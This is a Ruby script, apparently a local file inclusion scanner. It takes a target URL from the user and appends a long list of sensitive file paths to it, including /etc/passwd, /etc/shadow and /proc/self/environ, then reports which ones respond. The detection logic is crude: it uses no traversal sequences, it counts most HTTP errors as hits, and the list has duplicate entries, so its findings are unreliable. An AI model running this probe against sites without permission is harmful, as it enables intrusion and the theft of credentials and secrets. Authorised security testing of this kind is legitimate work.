require 'open-uri'
require 'colorize'

# Common LFI payloads to test
LFI_PAYLOADS = [
  '/etc/passwd',
  '/etc/hosts',
  '/proc/self/environ',
  '/etc/shadow',
  '/etc/group',
  '/etc/hosts',
  '/etc/hostname',
  '/etc/services',
  '/etc/resolv.conf',
  '/etc/network/interfaces',
  '/proc/self/environ',
  '/proc/version',
  '/proc/cmdline',
  '/proc/mounts',
  '/proc/net/route',
  '/proc/net/arp',
  '/proc/net/tcp',
  '/proc/net/udp',
  '/proc/net/raw',
  '/proc/net/unix',
  '/proc/cpuinfo',
  '/proc/meminfo',
  '/proc/ioports',
  '/proc/diskstats',
  '/proc/partitions',
  '/proc/modules',
  '/proc/net/dev',
  '/proc/net/if_inet6',
  '/proc/net/icmp',
  '/proc/net/snmp',
  '/proc/net/wireless',
  '/proc/net/rpc',
  '/proc/net/dev_mcast',
  '/proc/net/dev_netlink',
  '/proc/net/packet',
  '/proc/sys/kernel/osrelease',
  '/proc/sys/kernel/hostname',
  '/proc/sys/kernel/version',
  '/proc/sys/kernel/domainname',
  '/proc/sys/kernel/ostype',
  '/proc/sys/kernel/debug',
  '/proc/sys/kernel/modprobe',
  '/proc/sys/kernel/printk',
  '/proc/sys/kernel/core_pattern',
  '/proc/sys/kernel/ctrl-alt-del',
  '/proc/sys/kernel/pty',
  '/proc/sys/kernel/sched_domain',
  '/proc/sys/kernel/sched_rt_period_us',
  '/proc/sys/kernel/sched_rt_runtime_us',
  '/proc/sys/kernel/sched_schedstats',
  '/proc/sys/kernel/sched_latency_ns',
  '/proc/sys/kernel/sched_min_granularity_ns',
  '/proc/sys/kernel/sched_wakeup_granularity_ns',
  '/proc/sys/kernel/sched_migration_cost_ns',
  '/proc/sys/kernel/sched_rr_timeslice_ms',
  '/proc/sys/kernel/sched_compat_yield',
  '/proc/sys/kernel/sched_child_runs_first',
  '/proc/sys/kernel/threads-max',
  '/proc/sys/kernel/random/boot_id',
  '/proc/sys/kernel/random/uuid',
  '/proc/sys/kernel/random/boot_id',
  '/proc/sys/kernel/random/uuid',
  '/proc/sys/kernel/random/poolsize',
  '/proc/sys/kernel/random/entropy_avail',
  '/proc/sys/kernel/random/read_wakeup_threshold',
  '/proc/sys/kernel/random/write_wakeup_threshold',
  '/proc/sys/kernel/random/urandom_min_reseed_secs',
  '/proc/sys/kernel/random/urandom_max_reseed_secs',
  '/proc/sys/kernel/random/entropy_avail'
]

def test_lfi_vulnerability(url)
  puts "Testing for Local File Inclusion vulnerability on #{url}...".yellow
  vulnerabilities = []

  # Test each payload
  LFI_PAYLOADS.each do |payload|
    test_url = "#{url}#{payload}"
    begin
      response = open(test_url)
      if response
        vulnerabilities << payload
      end
    rescue OpenURI::HTTPError => e
      # Ignore 404 errors
      next if e.message.include?('404')
      vulnerabilities << payload
    rescue StandardError => e
      puts "An error occurred while testing #{test_url}: #{e.message}".red
      next
    end
  end

  # Display results
  if vulnerabilities.empty?
    puts "No vulnerabilities found on #{url}.".green
  else
    puts "The following vulnerabilities were found on #{url}:".red
    vulnerabilities.each do |vulnerability|
      puts " - #{vulnerability}"
    end
  end
end

puts "Enter your target website URL: "
target_url = gets.chomp

test_lfi_vulnerability(target_url)
